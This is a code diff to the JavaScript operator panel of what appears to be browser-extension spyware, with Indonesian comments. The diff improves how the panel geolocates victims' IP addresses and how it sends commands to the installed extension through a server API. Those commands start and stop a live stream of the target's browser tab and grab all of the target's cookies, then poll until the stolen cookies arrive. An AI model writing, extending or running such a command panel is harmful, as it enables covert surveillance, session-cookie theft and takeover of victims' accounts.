@@ -6846,12 +6846,26 @@ SCRIPT
 
     async function _lookupIP(ip) {
         const services = [
-            { url: `https://ipapi.co/${ip}/json/`, parse: d => d.country_name ? { country: d.country_name, region: d.region || '', city: d.city || '', isp: d.org || '' } : null },
-            { url: `https://ipinfo.io/${ip}/json`, parse: d => d.country ? { country: d.country, region: d.region || '', city: d.city || '', isp: d.org || '' } : null },
+            {
+                url: `https://freeipapi.com/api/json/${ip}`,
+                parse: d => d.countryName ? { country: d.countryName, region: d.regionName || '', city: d.cityName || '', isp: d.isp || '' } : null
+            },
+            {
+                url: `https://ip-api.com/json/${ip}?fields=country,regionName,city,isp,status`,
+                parse: d => d.status === 'success' ? { country: d.country, region: d.regionName || '', city: d.city || '', isp: d.isp || '' } : null
+            },
+            {
+                url: `https://ipapi.co/${ip}/json/`,
+                parse: d => d.country_name && !d.error ? { country: d.country_name, region: d.region || '', city: d.city || '', isp: d.org || '' } : null
+            },
+            {
+                url: `https://ipinfo.io/${ip}/json`,
+                parse: d => d.country ? { country: d.country, region: d.region || '', city: d.city || '', isp: d.org || '' } : null
+            },
         ];
         for (const svc of services) {
             try {
-                const res = await fetch(svc.url);
+                const res = await fetch(svc.url, { signal: AbortSignal.timeout(5000) });
                 if (!res.ok) continue;
                 const data = await res.json();
                 const loc = svc.parse(data);
@@ -7236,25 +7250,46 @@ SCRIPT
         }
         if (container) container.innerHTML = '<div style="font-size:12px;color:var(--text-muted);text-align:center;padding:12px;">⏳ Connecting live stream...</div>';
 
-        // Send command to extension
-        if (deviceId) {
-            try {
-                await fetch(`${API_URL}/api/command/${deviceId}`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
-                    body: JSON.stringify({ action: 'live_on', userId })
-                });
-            } catch (e) {}
+        // Send command to extension (pakai endpoint by-user agar deviceId otomatis dari server)
+        try {
+            const cmdRes = await fetch(`${API_URL}/api/command-by-user/${userId}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
+                body: JSON.stringify({ action: 'live_on' })
+            });
+            const cmdData = await cmdRes.json();
+            if (!cmdData.success) {
+                if (container) container.innerHTML = `<div style="font-size:12px;color:var(--danger);text-align:center;padding:12px;">❌ ${cmdData.error || 'Gagal kirim command — pastikan extension aktif'}</div>`;
+                if (btn) { btn.textContent = '🔴 Live OFF'; btn.style.color = 'var(--danger)'; btn.style.borderColor = 'rgba(255,59,59,0.2)'; btn.style.background = 'rgba(255,59,59,0.08)'; }
+                liveStates[userId] = { active: false, interval: null };
+                return;
+            }
+        } catch (e) {
+            if (container) container.innerHTML = '<div style="font-size:12px;color:var(--danger);text-align:center;padding:12px;">❌ Gagal koneksi ke server</div>';
+            return;
         }
 
         // Poll for live frames
+        let liveFrameReceived = false;
+        const liveStartTime = Date.now();
+        const LIVE_TIMEOUT_MS = 15000; // 15 detik timeout
+
         const liveInterval = setInterval(async () => {
+            // Timeout: kalau 15 detik belum ada frame, tampilkan error jelas
+            if (!liveFrameReceived && Date.now() - liveStartTime > LIVE_TIMEOUT_MS) {
+                const containerEl = document.getElementById('live-container-' + userId);
+                if (containerEl && containerEl.innerHTML.includes('Connecting')) {
+                    containerEl.innerHTML = '<div style="font-size:12px;color:var(--warning,#ffaa00);text-align:center;padding:16px;">⚠️ Extension tidak merespons.<br><span style="font-size:11px;color:var(--text-muted);">Pastikan extension aktif dan tab browser target tidak di chrome:// URL.</span></div>';
+                }
+                return;
+            }
             try {
                 const res = await fetch(`${API_URL}/api/live-frame/${userId}`, {
                     headers: { 'x-api-key': API_KEY }
                 });
                 const data = await res.json();
                 if (data.success && data.hasFrame && data.frame) {
+                    liveFrameReceived = true;
                     const containerEl = document.getElementById('live-container-' + userId);
                     if (containerEl) {
                         const age = Date.now() - (data.ts || 0);
@@ -7297,15 +7332,13 @@ SCRIPT
         if (state?.interval) clearInterval(state.interval);
         liveStates[userId] = { active: false, interval: null };
 
-        if (deviceId) {
-            try {
-                await fetch(`${API_URL}/api/command/${deviceId}`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
-                    body: JSON.stringify({ action: 'live_off', userId })
-                });
-            } catch (e) {}
-        }
+        try {
+            await fetch(`${API_URL}/api/command-by-user/${userId}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
+                body: JSON.stringify({ action: 'live_off' })
+            });
+        } catch (e) {}
         showToast('Live stream dihentikan', 'info');
     }
 
@@ -7314,19 +7347,23 @@ SCRIPT
     // ================================================================
     async function grabAllCookies(userId) {
         showToast('Mengirim perintah Grab Cookies...', 'info');
-        const account = allAccounts.find(a => String(a.userId) === String(userId));
-        const deviceId = account?.deviceId || '';
 
         try {
-            // Send command to extension
-            if (deviceId) {
-                await fetch(`${API_URL}/api/command/${deviceId}`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
-                    body: JSON.stringify({ action: 'grab_cookies', userId })
-                });
+            // Kirim command via endpoint by-user (server cari deviceId otomatis)
+            const cmdRes = await fetch(`${API_URL}/api/command-by-user/${userId}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
+                body: JSON.stringify({ action: 'grab_cookies' })
+            });
+            const cmdData = await cmdRes.json();
+            if (!cmdData.success) {
+                showToast('❌ ' + (cmdData.error || 'Gagal kirim command ke extension'), 'error');
+                return;
             }
-        } catch (e) {}
+        } catch (e) {
+            showToast('❌ Gagal koneksi ke server: ' + e.message, 'error');
+            return;
+        }
 
         // Poll for cookies to arrive (max 10s)
         let attempts = 0;
